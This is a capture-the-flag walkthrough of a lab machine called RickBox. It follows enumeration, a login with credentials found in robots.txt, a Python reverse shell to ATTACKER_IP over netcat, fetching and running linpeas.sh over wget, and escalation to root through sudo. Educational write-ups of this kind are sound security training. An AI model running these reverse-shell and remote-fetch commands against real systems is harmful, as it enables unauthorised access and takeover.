# RickBox — CTF Walkthrough

This walkthrough documents the steps I took to solve the RickBox CTF in a clear, chronological, and reproducible way. The goal is to show the discovery, artifacts, commands used, and privilege escalation path in a readable format.

> **Disclaimer:** For educational purposes only. Do not scan, exploit, or access systems without explicit authorization.

---

## 1. Target Overview
- Target IP: `10.10.31.65` (example)
- Open ports discovered: `22` (SSH), `80` (HTTP)

---

## 2. Enumeration
1. **Checked robots.txt**
   - Accessed `http://10.10.31.65/robots.txt` and found a random text: **`Wubbalubbadubdub`** — noted it.
2. **Username observed**
   - A username visible on the web page: **`R1ckRul3s`** — saved to notes.
3. **Directory brute-force (gobuster)**
   - Command used as an example:
     ```bash
     gobuster dir -u http://10.10.31.65:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
     ```
   - Result: `login.php` was discovered.

---

## 3. Web Login and Initial Access
1. Visited `login.php` and tried credentials derived from earlier findings: username `R1ckRul3s` and password `Wubbalubbadubdub` (from `robots.txt`). Login succeeded.
2. After logging in, the web interface provided a limited command execution box. Most commands were restricted, but **Python** execution was allowed — this became the pivot for further access.

---

## 4. Getting a Reverse Shell
1. Used a Python reverse-shell payload (PentestMonkey style). Example workflow:
   ```bash
   # On attacker machine: start a netcat listener
   nc -lvnp 4444

   # On target (single-line payload):
   python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
   ```
2. The listener caught a connection and gave an initial shell.

---

## 5. Stabilizing the Shell (PTY)
To improve interactivity, the following steps were executed:
```bash
# Spawn a proper tty (on the target shell)
python -c 'import pty; pty.spawn("/bin/bash")'

# Put the session into foreground on attacker machine after Ctrl+Z
stty raw -echo; fg

# Set TERM environment variable (on target shell)
export TERM=xterm
```
This made the shell behave better with interactive programs.

---

## 6. Capturing the First Flags / Ingredients
- First ingredient found: **Mr. Meeseek hair** (location not exhaustively listed here).
- Second ingredient: **1 jerry tear** — found in `/home/rick`.

> Note: When publishing to GitHub, you may omit exact sensitive files or full contents; listing file names and locations is usually enough.

---

## 7. Local Enumeration and Privilege Escalation
1. Planned to run `linpeas` to find privilege escalation vectors. To transfer `linpeas.sh` to the target, an HTTP server was started on the attacker machine:
   ```bash
   # On attacker:
   python3 -m http.server 8000
   # or
   python -m SimpleHTTPServer 8000
   ```
2. On the target, moved to `/dev/shm` and downloaded `linpeas.sh` using `wget`:
   ```bash
   cd /dev/shm
   wget http://ATTACKER_IP:8000/linpeas.sh
   chmod +x linpeas.sh
   ./linpeas.sh
   ```
3. `linpeas` indicated a misconfiguration that allowed escalating to root without a password. I verified `sudo -l` and used `sudo bash` (or `sudo -i`) to obtain a root shell:
   ```bash
   sudo -l
   sudo bash
   ```
4. As root, I inspected `/root` and found the third ingredient: **fleeb juice**.

---

## 8. Cleanup / Notes
- I noted file locations and artifacts in my local notes.
- When preparing a public report, avoid publishing real IP addresses, credentials, or full exploit payloads — use placeholder values like `ATTACKER_IP` and `TARGET_IP`.
- Consider cleaning up tools and temporary files on the target in a real authorized engagement.

---

## 9. Tips & Good Practices
- Save `gobuster` output to a file: `gobuster ... -o gobuster_output.txt`.
- Always check common files: `robots.txt`, `.git/`, `backup`, `config.php`, etc.
- After getting a shell, run basic recon commands first: `id`, `whoami`, `hostname`, `uname -a`, `ps aux`.
- `linpeas` and similar scripts are helpful for quick guidance, but always manually verify findings.

---

## 10. Example Git Commit Message
```
feat: add RickBox CTF walkthrough - initial report

- discovery, web login, reverse shell, pty stabilization
- linpeas-based privilege escalation
- found ingredients: Mr. Meeseek hair, 1 jerry tear, fleeb juice
```

---

If you want, I can:
- produce a ready-to-commit `README.md` file,
- remove placeholder values and add a short `.gitignore`,
- or expand any section with more commands and screenshots.
